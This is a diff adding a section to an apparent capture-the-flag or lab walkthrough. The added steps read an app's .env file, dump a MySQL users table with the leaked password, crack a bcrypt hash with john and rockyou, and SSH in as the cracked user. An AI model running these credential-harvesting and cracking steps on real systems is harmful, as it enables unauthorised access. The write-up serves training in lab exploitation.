@@ -138,7 +138,33 @@ stty rows 50 columns 200
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 4. Post-Exploitation
+## Foothold enumeration → SSH as josh
+
+### Read app config
+
+```bash
+ls -la /opt/
+cat /opt/DarkZero_Campaigns/.env
+```
+
+**3.6 — dump users table** (⚠ password from `.env`):
+
+```bash
+mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
+```
+
+**3.7 — crack josh** (⚠ your hash), on Kali:
+
+```bash
+echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
+```
+
+**3.8 — SSH in** (⚠ cracked password):
+
+```bash
+ssh josh@TARGET_IP
+```
 <div align="center">
 <br>
 <br>
